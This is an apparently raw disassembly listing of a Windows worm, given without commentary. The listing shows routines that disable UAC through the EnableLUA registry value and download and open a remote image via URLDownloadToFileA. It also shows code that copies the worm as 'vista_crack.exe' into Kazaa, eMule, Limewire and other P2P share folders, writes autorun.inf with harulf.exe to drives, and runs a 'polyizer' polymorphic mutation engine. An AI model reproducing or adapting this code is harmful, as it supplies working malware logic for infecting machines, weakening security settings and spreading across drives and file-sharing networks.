.text:00401F41                                         ; sub_401F45+1D\u2193r ...
.text:00401F45
.text:00401F45 ; =============== S U B R O U T I N E =======================================
.text:00401F45
.text:00401F45
.text:00401F45 sub_401F45      proc near               ; CODE XREF: sub_401EB4+3A\u2191p
.text:00401F45                 lea     eax, dword_401F41[ebp]
.text:00401F4B                 push    eax
.text:00401F4C                 push    2
.text:00401F4E                 push    0
.text:00401F50                 lea     eax, aSoftwareMicros[ebp] ; "Software\\Microsoft\\Windows\\CurrentVe"...
.text:00401F56                 push    eax
.text:00401F57                 push    80000002h
.text:00401F5C                 call    ss:dword_4017E5[ebp]
.text:00401F62                 cmp     dword_401F41, 0
.text:00401F69                 jz      short locret_401F9B
.text:00401F6B                 push    ss:dword_401F39[ebp]
.text:00401F71                 lea     eax, byte_401F3D[ebp]
.text:00401F77                 push    eax
.text:00401F78                 push    4
.text:00401F7A                 push    0
.text:00401F7C                 lea     eax, aEnablelua[ebp] ; "EnableLUA"
.text:00401F82                 push    eax
.text:00401F83                 push    ss:dword_401F41[ebp]
.text:00401F89                 call    ss:dword_4017ED[ebp]
.text:00401F8F                 push    ss:dword_401F41[ebp]
.text:00401F95                 call    ss:dword_4017F1[ebp]
.text:00401F9B
.text:00401F9B locret_401F9B:                          ; CODE XREF: sub_401F45+24\u2191j
.text:00401F9B                 retn
.text:00401F9B sub_401F45      endp
.text:00401F9B
.text:00401F9B ; ---------------------------------------------------------------------------
.text:00401F9C aHttpWwwSaddams db 'http://www.saddamsfamily.com/sf-logony.jpg',0
.text:00401F9C                                         ; DATA XREF: sub_402029+52\u2193o
.text:00401FC7 aCSaddamsfamily db 'c:\saddamsfamily.jpg',0
.text:00401FC7                                         ; DATA XREF: sub_402029+4B\u2193o
.text:00401FDC aExplorerExeCSa db 'explorer.exe "c:\saddamsfamily.jpg"',0
.text:00401FDC                                         ; DATA XREF: sub_402029+69\u2193o
.text:00402000 aUrldownloadtof db 'URLDownloadToFileA',0
.text:00402000                                         ; DATA XREF: sub_402029+39\u2193o
.text:00402013 aUrlmonDll      db 'urlmon.dll',0       ; DATA XREF: sub_402029+28\u2193o
.text:0040201E                 align 10h
.text:00402020                 db 2 dup(0)
.text:00402022 word_402022     dw 0                    ; DATA XREF: sub_402029+2\u2193o
.text:00402022                                         ; sub_402029+1B\u2193o
.text:00402024                 db 2 dup(0)
.text:00402026 aDd             db 'dd',0               ; DATA XREF: sub_402029+9\u2193o
.text:00402029
.text:00402029 ; =============== S U B R O U T I N E =======================================
.text:00402029
.text:00402029
.text:00402029 sub_402029      proc near               ; CODE XREF: start+31D\u2191p
.text:00402029                                         ; start+337\u2191p
.text:00402029                 push    4
.text:0040202B                 lea     eax, word_402022[ebp]
.text:00402031                 push    eax
.text:00402032                 lea     eax, aDd[ebp]   ; "dd"
.text:00402038                 push    eax
.text:00402039                 xor     eax, eax
.text:0040203B                 push    eax
.text:0040203C                 push    eax
.text:0040203D                 push    eax
.text:0040203E                 call    ss:dword_40175F[ebp]
.text:00402044                 lea     eax, word_402022[ebp]
.text:0040204A                 cmp     word ptr [eax], 3930h
.text:0040204F                 jnz     short locret_40209F
.text:00402051                 lea     eax, aUrlmonDll[ebp] ; "urlmon.dll"
.text:00402057                 push    eax
.text:00402058                 call    ss:dword_40177B[ebp]
.text:0040205E                 or      eax, eax
.text:00402060                 jz      short locret_40209F
.text:00402062                 lea     edx, aUrldownloadtof[ebp] ; "URLDownloadToFileA"
.text:00402068                 push    edx
.text:00402069                 push    eax
.text:0040206A                 call    ss:dword_401449[ebp]
.text:00402070                 xor     edx, edx
.text:00402072                 push    edx
.text:00402073                 push    edx
.text:00402074                 lea     ebx, aCSaddamsfamily[ebp] ; "c:\\saddamsfamily.jpg"
.text:0040207A                 push    ebx
.text:0040207B                 lea     ebx, aHttpWwwSaddams[ebp] ; "http://www.saddamsfamily.com/sf-logony."...
.text:00402081                 push    ebx
.text:00402082                 push    edx
.text:00402083                 call    eax
.text:00402085                 push    0BB8h
.text:0040208A                 call    ss:dword_401763[ebp]
.text:00402090                 push    5
.text:00402092                 lea     eax, aExplorerExeCSa[ebp] ; "explorer.exe \"c:\\saddamsfamily.jpg\""
.text:00402098                 push    eax
.text:00402099                 call    ss:dword_40179F[ebp]
.text:0040209F
.text:0040209F locret_40209F:                          ; CODE XREF: sub_402029+26\u2191j
.text:0040209F                                         ; sub_402029+37\u2191j
.text:0040209F                 retn
.text:0040209F sub_402029      endp
.text:0040209F
.text:0040209F ; ---------------------------------------------------------------------------
.text:004020A0 aCProgramFilesK db 'c:\Program Files\Kazaa Lite\My Shared Folder\vista_crack.exe',0
.text:004020A0                                         ; DATA XREF: sub_40224D\u2193o
.text:004020DD aCProgramFilesK_0 db 'c:\Program Files\Kazaa\My Shared Folder\vista_crack.exe',0
.text:00402115 aCProgramFilesE db 'c:\Program Files\Edonkey2000\Incoming\vista_crack.exe',0
.text:0040214B aCProgramFilesI db 'c:\Program Files\Icq\Shared Files\vista_crack.exe',0
.text:0040217D aCProgramFilesE_0 db 'c:\Program Files\emule\incoming\vista_crack.exe',0
.text:004021AD aCProgramFilesG db 'c:\Program Files\Gnucleus\Downloads\Incoming\vista_crack.exe',0
.text:004021EA aCProgramFilesK_1 db 'c:\Program Files\KMD\My Shared Folder\vista_crack.exe',0
.text:00402220 aCProgramFilesL db 'c:\Program Files\Limewire\Shared\vista_crack',0
.text:0040224D
.text:0040224D ; =============== S U B R O U T I N E =======================================
.text:0040224D
.text:0040224D
.text:0040224D sub_40224D      proc near               ; CODE XREF: start+322\u2191p
.text:0040224D                                         ; start+327\u2191p ...
.text:0040224D                 lea     esi, aCProgramFilesK[ebp] ; "c:\\Program Files\\Kazaa Lite\\My Share"...
.text:00402253                 push    8
.text:00402255                 pop     ecx
.text:00402256
.text:00402256 loc_402256:                             ; CODE XREF: sub_40224D+25\u2193j
.text:00402256                 push    ecx
.text:00402257                 push    esi
.text:00402258                 push    0
.text:0040225A                 push    esi
.text:0040225B                 push    ss:dword_40239D[ebp]
.text:00402261                 call    ss:dword_40178B[ebp]
.text:00402267                 pop     esi
.text:00402268
.text:00402268 loc_402268:                             ; CODE XREF: sub_40224D+21\u2193j
.text:00402268                 cmp     byte ptr [esi], 0
.text:0040226B                 jz      short loc_402270
.text:0040226D                 inc     esi
.text:0040226E                 jmp     short loc_402268
.text:00402270 ; ---------------------------------------------------------------------------
.text:00402270
.text:00402270 loc_402270:                             ; CODE XREF: sub_40224D+1E\u2191j
.text:00402270                 inc     esi
.text:00402271                 pop     ecx
.text:00402272                 loop    loc_402256
.text:00402274                 retn
.text:00402274 sub_40224D      endp
.text:00402274
.text:00402274 ; ---------------------------------------------------------------------------
.text:00402275 byte_402275     db 61h, 3Ah, 5Ch        ; DATA XREF: sub_402279+8\u2193o
.text:00402275                                         ; sub_40230C+24\u2193o
.text:00402278                 db 0
.text:00402279
.text:00402279 ; =============== S U B R O U T I N E =======================================
.text:00402279
.text:00402279
.text:00402279 sub_402279      proc near               ; CODE XREF: start+32C\u2191p
.text:00402279                                         ; start+346\u2191p
.text:00402279                 call    ss:dword_40172B[ebp]
.text:0040227F                 xor     edx, edx
.text:00402281                 lea     edx, byte_402275[ebp]
.text:00402287                 xor     ecx, ecx
.text:00402289
.text:00402289 loc_402289:                             ; CODE XREF: sub_402279+24\u2193j
.text:00402289                 bt      eax, ecx
.text:0040228C                 jnb     short loc_402295
.text:0040228E                 pusha
.text:0040228F                 call    sub_40230C
.text:00402294                 popa
.text:00402295
.text:00402295 loc_402295:                             ; CODE XREF: sub_402279+13\u2191j
.text:00402295                 inc     byte ptr [edx]
.text:00402297                 inc     ecx
.text:00402298                 cmp     ecx, 21h ; '!'
.text:0040229B                 ja      short locret_40229F
.text:0040229D                 jmp     short loc_402289
.text:0040229F ; ---------------------------------------------------------------------------
.text:0040229F
.text:0040229F locret_40229F:                          ; CODE XREF: sub_402279+22\u2191j
.text:0040229F                 retn
.text:0040229F sub_402279      endp
.text:0040229F
.text:0040229F ; ---------------------------------------------------------------------------
.text:004022A0 aAutorunOpenHar db '[autorun]',0Dh,0Ah  ; DATA XREF: sub_40230C+6F\u2193o
.text:004022A0                 db 'open=harulf.exe',0Dh,0Ah
.text:004022A0                 db 'shell\open\command=harulf.exe',0Dh,0Ah
.text:004022A0                 db 'shell\open\default=1',0
.text:004022F0 aAutorunInf     db 'autorun.inf',0      ; DATA XREF: sub_40230C+58\u2193o
.text:004022FC aHarulfExe      db '\harulf.exe',0      ; DATA XREF: sub_40230C+38\u2193o
.text:00402308 dword_402308    dd 0                    ; DATA XREF: sub_40230C+D\u2193w
.text:00402308                                         ; sub_40230C+13\u2193r ...
.text:0040230C
.text:0040230C ; =============== S U B R O U T I N E =======================================
.text:0040230C
.text:0040230C
.text:0040230C sub_40230C      proc near               ; CODE XREF: sub_402279+16\u2191p
.text:0040230C                 push    100h
.text:00402311                 push    0
.text:00402313                 call    ss:dword_401753[ebp]
.text:00402319                 mov     ss:dword_402308[ebp], eax
.text:0040231F                 push    ss:dword_402308[ebp]
.text:00402325                 push    100h
.text:0040232A                 call    ss:dword_40178F[ebp]
.text:00402330                 lea     esi, byte_402275[ebp]
.text:00402336                 push    esi
.text:00402337                 call    ss:dword_401793[ebp]
.text:0040233D                 call    sub_401A5A
.text:00402342                 push    0
.text:00402344                 lea     eax, aHarulfExe[ebp] ; "\\harulf.exe"
.text:0040234A                 push    eax
.text:0040234B                 push    ss:dword_40239D[ebp]
.text:00402351                 call    ss:dword_40178B[ebp]
.text:00402357                 xor     eax, eax
.text:00402359                 push    eax
.text:0040235A                 push    eax
.text:0040235B                 push    2
.text:0040235D                 push    eax
.text:0040235E                 push    eax
.text:0040235F                 push    40000000h
.text:00402364                 lea     eax, aAutorunInf[ebp] ; "autorun.inf"
.text:0040236A                 push    eax
.text:0040236B                 call    ss:dword_40172F[ebp]
.text:00402371                 push    eax
.text:00402372                 push    0
.text:00402374                 mov     edx, esp
.text:00402376                 push    0
.text:00402378                 push    edx
.text:00402379                 push    50h ; 'P'
.text:0040237B                 lea     edx, aAutorunOpenHar[ebp] ; "[autorun]\r\nopen=harulf.exe\r\nshell\\"...
.text:00402381                 push    edx
.text:00402382                 push    eax
.text:00402383                 call    ss:dword_401737[ebp]
.text:00402389                 pop     eax
.text:0040238A                 call    ss:dword_401733[ebp]
.text:00402390                 push    ss:dword_402308[ebp]
.text:00402396                 call    ss:dword_401793[ebp]
.text:0040239C                 retn
.text:0040239C sub_40230C      endp
.text:0040239C
.text:0040239C ; ---------------------------------------------------------------------------
.text:0040239D dword_40239D    dd 0                    ; DATA XREF: sub_40224D+E\u2191r
.text:0040239D                                         ; sub_40230C+3F\u2191r ...
.text:004023A1
.text:004023A1 ; =============== S U B R O U T I N E =======================================
.text:004023A1
.text:004023A1
.text:004023A1 sub_4023A1      proc near               ; CODE XREF: start+30F\u2191p
.text:004023A1                 push    100h
.text:004023A6                 push    0
.text:004023A8                 call    ss:dword_401753[ebp]
.text:004023AE                 mov     ss:dword_40239D[ebp], eax
.text:004023B4                 push    100h
.text:004023B9                 push    ss:dword_40239D[ebp]
.text:004023BF                 push    0
.text:004023C1                 call    ss:dword_401787[ebp]
.text:004023C7                 mov     esi, ss:dword_40239D[ebp]
.text:004023CD                 push    esi
.text:004023CE                 call    sub_40243A
.text:004023D3                 pop     esi
.text:004023D4                 add     esi, ecx
.text:004023D6                 mov     ecx, 8
.text:004023DB                 xor     eax, eax
.text:004023DD
.text:004023DD loc_4023DD:                             ; CODE XREF: sub_4023A1+44\u2193j
.text:004023DD                 dec     esi
.text:004023DE                 cmp     word ptr [esi], 6168h
.text:004023E3                 jz      short loc_4023E8
.text:004023E5                 loop    loc_4023DD
.text:004023E7                 retn
.text:004023E8 ; ---------------------------------------------------------------------------
.text:004023E8
.text:004023E8 loc_4023E8:                             ; CODE XREF: sub_4023A1+42\u2191j
.text:004023E8                 dec     eax
.text:004023E9                 retn
.text:004023E9 sub_4023A1      endp
.text:004023E9
.text:004023E9 ; ---------------------------------------------------------------------------
.text:004023EA aExplorer       db 'explorer ',0        ; DATA XREF: sub_4023F4\u2193o
.text:004023F4
.text:004023F4 ; =============== S U B R O U T I N E =======================================
.text:004023F4
.text:004023F4
.text:004023F4 sub_4023F4      proc near               ; CODE XREF: start+318\u2191p
.text:004023F4                 lea     esi, aExplorer[ebp] ; "explorer "
.text:004023FA                 mov     edi, esp
.text:004023FC                 sub     edi, 200h
.text:00402402                 push    edi
.text:00402403                 mov     ecx, 9
.text:00402408                 rep movsb
.text:0040240A                 mov     ecx, 2
.text:0040240F                 mov     esi, ss:dword_40239D[ebp]
.text:00402415                 rep movsb
.text:00402417                 mov     byte ptr [edi+1], 0
.text:0040241B                 mov     ecx, 0Bh
.text:00402420                 push    ecx
.text:00402421                 push    ecx
.text:00402422                 push    0
.text:00402424                 call    dword_401753
.text:0040242A                 pop     ecx
.text:0040242B                 pop     esi
.text:0040242C                 mov     edi, eax
.text:0040242E                 rep movsb
.text:00402430                 push    5
.text:00402432                 push    eax
.text:00402433                 call    ss:dword_40179F[ebp]
.text:00402439                 retn
.text:00402439 sub_4023F4      endp
.text:00402439
.text:0040243A
.text:0040243A ; =============== S U B R O U T I N E =======================================
.text:0040243A
.text:0040243A
.text:0040243A sub_40243A      proc near               ; CODE XREF: sub_401A5A+4A\u2191p
.text:0040243A                                         ; sub_401A5A+8F\u2191p ...
.text:0040243A                 xor     ecx, ecx
.text:0040243C
.text:0040243C loc_40243C:                             ; CODE XREF: sub_40243A+9\u2193j
.text:0040243C                 cmp     byte ptr [esi], 0
.text:0040243F                 jz      short locret_402445
.text:00402441                 inc     esi
.text:00402442                 inc     ecx
.text:00402443                 jmp     short loc_40243C
.text:00402445 ; ---------------------------------------------------------------------------
.text:00402445
.text:00402445 locret_402445:                          ; CODE XREF: sub_40243A+5\u2191j
.text:00402445                 retn
.text:00402445 sub_40243A      endp
.text:00402445
.text:00402446
.text:00402446 ; =============== S U B R O U T I N E =======================================
.text:00402446
.text:00402446
.text:00402446 sub_402446      proc near               ; CODE XREF: start+2FF\u2191p
.text:00402446                                         ; sub_40268D+7\u2193p
.text:00402446                 inc     ecx
.text:00402447                 push    ecx
.text:00402448                 call    ss:dword_40179B[ebp]
.text:0040244E                 mov     ecx, eax
.text:00402450                 rdtsc
.text:00402452                 xor     ecx, eax
.text:00402454                 xchg    eax, ecx
.text:00402455                 pop     ecx
.text:00402456
.text:00402456 loc_402456:                             ; CODE XREF: sub_402446+19\u2193j
.text:00402456                                         ; sub_402446+21\u2193j
.text:00402456                 push    ecx
.text:00402457                 xor     edx, edx
.text:00402459                 div     ecx
.text:0040245B                 xchg    eax, edx
.text:0040245C                 pop     ecx
.text:0040245D                 cmp     eax, ecx
.text:0040245F                 ja      short loc_402456
.text:00402461                 cmp     eax, 0
.text:00402464                 ja      short locret_402469
.text:00402466                 xchg    eax, edx
.text:00402467                 jmp     short loc_402456
.text:00402469 ; ---------------------------------------------------------------------------
.text:00402469
.text:00402469 locret_402469:                          ; CODE XREF: sub_402446+1E\u2191j
.text:00402469                 retn
.text:00402469 sub_402446      endp
.text:00402469
.text:0040246A
.text:0040246A ; =============== S U B R O U T I N E =======================================
.text:0040246A
.text:0040246A ; Attributes: noreturn
.text:0040246A
.text:0040246A sub_40246A      proc near               ; CODE XREF: polyizer+51\u2193p
.text:0040246A                                         ; .text:00402619\u2193p ...
.text:0040246A                 pusha
.text:0040246B                 sub     esp, 6Eh
.text:0040246E                 cld
.text:0040246F                 mov     edi, esp
.text:00402471                 push    esi
.text:00402472                 call    sub_4024B2
.text:00402477                 pop     eax
.text:00402478                 jmp     far ptr 0BFB1h:0F33E0011h
.text:00402478 sub_40246A      endp
.text:00402478
.text:00402478 ; ---------------------------------------------------------------------------
.text:0040247F                 db 80h
.text:00402480                 dd 19B0AC0Bh, 0A0C1154h, 0F3F3FFFFh, 555F0F88h, 550D5D55h
.text:00402480                 dd 1D005FFh, 7551004h, 0F0EC40Dh, 0F8FF7FA0h, 0FFFFFFF8h
.text:00402480                 dd 0FFFFFF55h, 100101FFh
.text:004024B0                 db 10h, 15h
.text:004024B2
.text:004024B2 ; =============== S U B R O U T I N E =======================================
.text:004024B2
.text:004024B2
.text:004024B2 sub_4024B2      proc near               ; CODE XREF: sub_40246A+8\u2191p
.text:004024B2
.text:004024B2 arg_76          = dword ptr  7Ah
.text:004024B2 arg_8E          = dword ptr  92h
.text:004024B2
.text:004024B2                 pop     ebx
.text:004024B3                 lea     esi, [ebx+0Dh]
.text:004024B6                 push    64h ; 'd'
.text:004024B8                 pop     ecx
.text:004024B9
.text:004024B9 loc_4024B9:                             ; CODE XREF: sub_4024B2+F\u2193j
.text:004024B9                 bt      [ebx], ecx
.text:004024BC                 setalc
.text:004024BD                 jnb     short loc_4024C0
.text:004024BF                 lodsb
.text:004024C0
.text:004024C0 loc_4024C0:                             ; CODE XREF: sub_4024B2+B\u2191j
.text:004024C0                 stosb
.text:004024C1                 loop    loc_4024B9
.text:004024C3                 pop     esi
.text:004024C4                 push    2
.text:004024C6                 pop     ebx
.text:004024C7                 mov     edx, ebx
.text:004024C9
.text:004024C9 loc_4024C9:                             ; CODE XREF: sub_4024B2+59\u2193j
.text:004024C9                 lodsb
.text:004024CA                 push    eax
.text:004024CB                 push    eax
.text:004024CC                 cmp     al, 66h ; 'f'
.text:004024CE                 cmovz   ebx, ecx
.text:004024D1                 cmp     al, 67h ; 'g'
.text:004024D3                 cmovz   edx, ecx
.text:004024D6                 cmp     al, 0EAh ; ''
.text:004024D8                 jz      short loc_4024DF
.text:004024DA                 cmp     al, 9Ah ; ''
.text:004024DC                 jnz     short loc_4024E3
.text:004024DE                 inc     esi
.text:004024DF
.text:004024DF loc_4024DF:                             ; CODE XREF: sub_4024B2+26\u2191j
.text:004024DF                 lea     esi, [esi+ebx+3]
.text:004024E3
.text:004024E3 loc_4024E3:                             ; CODE XREF: sub_4024B2+2A\u2191j
.text:004024E3                 cmp     al, 0C8h ; ''
.text:004024E5                 jz      short loc_4024ED
.text:004024E7                 and     al, 0F7h
.text:004024E9                 cmp     al, 0C2h ; ''
.text:004024EB                 jnz     short loc_4024EF
.text:004024ED
.text:004024ED loc_4024ED:                             ; CODE XREF: sub_4024B2+33\u2191j
.text:004024ED                 inc     esi
.text:004024EE                 inc     esi
.text:004024EF
.text:004024EF loc_4024EF:                             ; CODE XREF: sub_4024B2+39\u2191j
.text:004024EF                 and     al, 0E7h
.text:004024F1                 cmp     al, 26h ; '&'
.text:004024F3                 pop     eax
.text:004024F4                 jz      short loc_40250A
.text:004024F6                 cmp     al, 0F1h ; ''
.text:004024F8                 jz      short loc_402508
.text:004024FA                 and     al, 0FCh
.text:004024FC                 cmp     al, 0A0h ; ''
.text:004024FE                 jnz     short loc_402504
.text:00402500                 lea     esi, [esi+edx+2]
.text:00402504
.text:00402504 loc_402504:                             ; CODE XREF: sub_4024B2+4C\u2191j
.text:00402504                 cmp     al, 0F0h ; ''
.text:00402506                 jz      short loc_40250A
.text:00402508
.text:00402508 loc_402508:                             ; CODE XREF: sub_4024B2+46\u2191j
.text:00402508                 cmp     al, 64h ; 'd'
.text:0040250A
.text:0040250A loc_40250A:                             ; CODE XREF: sub_4024B2+42\u2191j
.text:0040250A                                         ; sub_4024B2+54\u2191j
.text:0040250A                 pop     eax
.text:0040250B                 jz      short loc_4024C9
.text:0040250D                 mov     edi, esp
.text:0040250F                 push    edx
.text:00402510                 push    eax
.text:00402511                 cmp     al, 0Fh
.text:00402513                 jnz     short loc_402516
.text:00402515                 lodsb
.text:00402516
.text:00402516 loc_402516:                             ; CODE XREF: sub_4024B2+61\u2191j
.text:00402516                 pushf
.text:00402517                 aam     10h
.text:00402519                 xchg    cl, ah
.text:0040251B                 cwde
.text:0040251C                 cdq
.text:0040251D                 xor     ebp, ebp
.text:0040251F                 popf
.text:00402520                 jnz     short loc_402538
.text:00402522                 add     edi, 35h ; '5'
.text:00402525                 jecxz   short loc_402534
.text:00402527
.text:00402527 loc_402527:                             ; CODE XREF: sub_4024B2+7C\u2193j
.text:00402527                 bt      [edi], ebp
.text:0040252A                 jnb     short loc_40252D
.text:0040252C                 inc     edx
.text:0040252D
.text:0040252D loc_40252D:                             ; CODE XREF: sub_4024B2+78\u2191j
.text:0040252D                 inc     ebp
.text:0040252E                 loop    loc_402527
.text:00402530                 jb      short loc_402534
.text:00402532                 setalc
.text:00402533                 cdq
.text:00402534
.text:00402534 loc_402534:                             ; CODE XREF: sub_4024B2+73\u2191j
.text:00402534                                         ; sub_4024B2+7E\u2191j
.text:00402534                 shl     edx, 1
.text:00402536                 jmp     short loc_402550
.text:00402538 ; ---------------------------------------------------------------------------
.text:00402538
.text:00402538 loc_402538:                             ; CODE XREF: sub_4024B2+6E\u2191j
.text:00402538                 sub     cl, 4
.text:0040253B                 jns     short loc_402541
.text:0040253D                 mov     cl, 0Ch
.text:0040253F                 and     al, 7
.text:00402541
.text:00402541 loc_402541:                             ; CODE XREF: sub_4024B2+89\u2191j
.text:00402541                 jecxz   short loc_40254E
.text:00402543
.text:00402543 loc_402543:                             ; CODE XREF: sub_4024B2+98\u2193j
.text:00402543                 adc     dl, 1
.text:00402546                 inc     ebp
.text:00402547                 bt      [edi], ebp
.text:0040254A                 loop    loc_402543
.text:0040254C                 jb      short loc_402550
.text:0040254E
.text:0040254E loc_40254E:                             ; CODE XREF: sub_4024B2:loc_402541\u2191j
.text:0040254E                 shr     al, 1
.text:00402550
.text:00402550 loc_402550:                             ; CODE XREF: sub_4024B2+84\u2191j
.text:00402550                                         ; sub_4024B2+9A\u2191j
.text:00402550                 xchg    cl, al
.text:00402552                 lea     edx, [ecx+edx*8]
.text:00402555                 pop     ecx
.text:00402556                 pop     ebp
.text:00402557                 bt      [edi+2], edx
.text:0040255B                 jnb     short loc_402598
.text:0040255D                 lodsb
.text:0040255E                 aam     8
.text:00402560                 shl     ah, 4
.text:00402563                 jnb     short loc_402567
.text:00402565                 js      short loc_402586
.text:00402567
.text:00402567 loc_402567:                             ; CODE XREF: sub_4024B2+B1\u2191j
.text:00402567                 pushf
.text:00402568                 test    ebp, ebp
.text:0040256A                 jnz     short loc_402572
.text:0040256C                 sub     al, 6
.text:0040256E                 jnz     short loc_402579
.text:00402570                 mov     al, 5
.text:00402572
.text:00402572 loc_402572:                             ; CODE XREF: sub_4024B2+B8\u2191j
.text:00402572                 cmp     al, 4
.text:00402574                 jnz     short loc_402579
.text:00402576                 lodsb
.text:00402577                 and     al, 7
.text:00402579
.text:00402579 loc_402579:                             ; CODE XREF: sub_4024B2+BC\u2191j
.text:00402579                                         ; sub_4024B2+C2\u2191j
.text:00402579                 popf
.text:0040257A                 jb      short loc_402582
.text:0040257C                 js      short loc_402585
.text:0040257E                 cmp     al, 5
.text:00402580                 jnz     short loc_402586
.text:00402582
.text:00402582 loc_402582:                             ; CODE XREF: sub_4024B2+C8\u2191j
.text:00402582                 add     esi, ebp
.text:00402584                 inc     esi
.text:00402585
.text:00402585 loc_402585:                             ; CODE XREF: sub_4024B2+CA\u2191j
.text:00402585                 inc     esi
.text:00402586
.text:00402586 loc_402586:                             ; CODE XREF: sub_4024B2+B3\u2191j
.text:00402586                                         ; sub_4024B2+CE\u2191j
.text:00402586                 test    ah, 60h
.text:00402589                 jnz     short loc_402598
.text:0040258B                 xchg    eax, ecx
.text:0040258C                 cmp     al, 0F6h ; ''
.text:0040258E                 jz      short loc_402597
.text:00402590                 cmp     al, 0F7h ; ''
.text:00402592                 jnz     short loc_402598
.text:00402594                 add     esi, ebx
.text:00402596                 inc     esi
.text:00402597
.text:00402597 loc_402597:                             ; CODE XREF: sub_4024B2+DC\u2191j
.text:00402597                 inc     esi
.text:00402598
.text:00402598 loc_402598:                             ; CODE XREF: sub_4024B2+A9\u2191j
.text:00402598                                         ; sub_4024B2+D7\u2191j ...
.text:00402598                 shl     edx, 1
.text:0040259A                 bt      [edi+13h], edx
.text:0040259E                 jnb     short loc_4025AA
.text:004025A0                 inc     edx
.text:004025A1                 bt      [edi+13h], edx
.text:004025A5                 jnb     short loc_4025A9
.text:004025A7                 adc     esi, ebx
.text:004025A9
.text:004025A9 loc_4025A9:                             ; CODE XREF: sub_4024B2+F3\u2191j
.text:004025A9                 inc     esi
.text:004025AA
.text:004025AA loc_4025AA:                             ; CODE XREF: sub_4024B2+EC\u2191j
.text:004025AA                 add     esp, 6Eh
.text:004025AD                 sub     esi, [esp-76h+arg_76]
.text:004025B1                 mov     [esp-76h+arg_8E], esi
.text:004025B5                 popa
.text:004025B6                 retn
.text:004025B6 sub_4024B2      endp ; sp-analysis failed
.text:004025B6
.text:004025B6 ; ---------------------------------------------------------------------------
.text:004025B7 dword_4025B7    dd 0                    ; DATA XREF: polyizer\u2193w
.text:004025B7                                         ; .text:00402627\u2193w ...
.text:004025BB dword_4025BB    dd 0                    ; DATA XREF: polyizer+A\u2193w
.text:004025BB                                         ; .text:00402636\u2193w ...
.text:004025BF
.text:004025BF ; =============== S U B R O U T I N E =======================================
.text:004025BF
.text:004025BF ; Attributes: noreturn
.text:004025BF
.text:004025BF polyizer        proc near               ; CODE XREF: start+2AA\u2191p
.text:004025BF                 mov     ss:dword_4025B7[ebp], 0
.text:004025C9                 mov     ss:dword_4025BB[ebp], 0
.text:004025D3                 lea     esi, loc_4018C7[ebp]
.text:004025D9                 mov     ecx, 120h
.text:004025DE                 push    esi
.text:004025DF
.text:004025DF loc_4025DF:                             ; CODE XREF: polyizer+25\u2193j
.text:004025DF                 xor     edx, edx
.text:004025E1                 mov     [esi], edx
.text:004025E3                 inc     esi
.text:004025E4                 loop    loc_4025DF
.text:004025E6                 pop     edi
.text:004025E7                 lea     eax, byte_402681[ebp]
.text:004025ED                 mov     ecx, 2
.text:004025F2                 xor     ecx, ecx
.text:004025F4                 mov     ecx, 9
.text:004025F9
.text:004025F9 loc_4025F9:                             ; CODE XREF: .text:00402642\u2193j
.text:004025F9                 push    ecx
.text:004025FA                 call    sub_40268D
.text:004025FF                 mov     esi, edx
.text:00402601                 mov     ebx, 9
.text:00402606                 sub     ebx, ecx
.text:00402608                 xchg    ecx, ebx
.text:0040260A                 call    sub_402663
.text:0040260F                 push    esi
.text:00402610                 call    sub_40246A
.text:00402610 polyizer        endp
.text:00402610
.text:00402615 ; ---------------------------------------------------------------------------
.text:00402615                 mov     ebx, eax
.text:00402617                 add     esi, eax
.text:00402619                 call    sub_40246A
.text:0040261E ; ---------------------------------------------------------------------------
.text:0040261E                 add     ebx, eax
.text:00402620                 cmp     dword ptr [esp+4], 5
.text:00402625                 jb      short loc_40262F
.text:00402627                 add     ss:dword_4025B7[ebp], ebx
.text:0040262D                 jmp     short loc_40263C
.text:0040262F ; ---------------------------------------------------------------------------
.text:0040262F
.text:0040262F loc_40262F:                             ; CODE XREF: .text:00402625\u2191j
.text:0040262F                 cmp     dword ptr [esp+4], 3
.text:00402634                 jb      short loc_40263C
.text:00402636                 add     ss:dword_4025BB[ebp], ebx
.text:0040263C
.text:0040263C loc_40263C:                             ; CODE XREF: .text:0040262D\u2191j
.text:0040263C                                         ; .text:00402634\u2191j
.text:0040263C                 xchg    ecx, ebx
.text:0040263E                 pop     esi
.text:0040263F                 rep movsb
.text:00402641                 pop     ecx
.text:00402642                 loop    loc_4025F9
.text:00402644                 lea     eax, loc_4018C7[ebp]
.text:0040264A                 add     eax, ss:dword_4025B7[ebp]
.text:00402650                 add     eax, ss:dword_4025BB[ebp]
.text:00402656                 inc     eax
.text:00402657                 mov     ebx, ss:dword_4025BB[ebp]
.text:0040265D                 inc     ebx
.text:0040265E                 not     bl
.text:00402660                 mov     [eax], bl
.text:00402662                 retn
.text:00402663
.text:00402663 ; =============== S U B R O U T I N E =======================================
.text:00402663
.text:00402663
.text:00402663 sub_402663      proc near               ; CODE XREF: polyizer+4B\u2191p
.text:00402663                 xor     ebx, ebx
.text:00402665                 or      ecx, ecx
.text:00402667                 jz      short locret_402680
.text:00402669
.text:00402669 loc_402669:                             ; CODE XREF: sub_402663+1B\u2193j
.text:00402669                 call    sub_40246A
.text:0040266E ; ---------------------------------------------------------------------------
.text:0040266E                 add     ebx, eax
.text:00402670                 add     esi, eax
.text:00402672                 call    sub_40246A
.text:00402677 ; ---------------------------------------------------------------------------
.text:00402677                 add     ebx, eax
.text:00402679                 add     esi, eax
.text:0040267B                 dec     ecx
.text:0040267C                 or      ecx, ecx
.text:0040267E                 jnz     short loc_402669
.text:00402680
.text:00402680 locret_402680:                          ; CODE XREF: sub_402663+4\u2191j
.text:00402680                 retn
.text:00402680 sub_402663      endp
.text:00402680
.text:00402680 ; ---------------------------------------------------------------------------
.text:00402681 byte_402681     db 3 dup(0)             ; DATA XREF: polyizer+28\u2191o
.text:00402681                                         ; sub_40268D+16\u2193o
.text:00402684                 dd 1D00h, 4000h
.text:0040268C                 db 0
.text:0040268D
.text:0040268D ; =============== S U B R O U T I N E =======================================
.text:0040268D
.text:0040268D
.text:0040268D sub_40268D      proc near               ; CODE XREF: polyizer+3B\u2191p
.text:0040268D                 push    ecx
.text:0040268E                 push    ebx
.text:0040268F                 mov     ecx, 3
.text:00402694                 call    sub_402446
.text:00402699                 dec     eax
.text:0040269A                 xor     edx, edx
.text:0040269C                 mov     ecx, 4
.text:004026A1                 mul     ecx
.text:004026A3                 lea     edx, byte_402681[ebp]
.text:004026A9                 add     edx, eax
.text:004026AB                 mov     edx, [edx]
.text:004026AD                 lea     ebx, sub_4026BA[ebp]
.text:004026B3                 add     ebx, edx
.text:004026B5                 xchg    edx, ebx
.text:004026B7                 pop     ebx
.text:004026B8                 pop     ecx
.text:004026B9                 retn
.text:004026B9 sub_40268D      endp
.text:004026B9
.text:004026BA
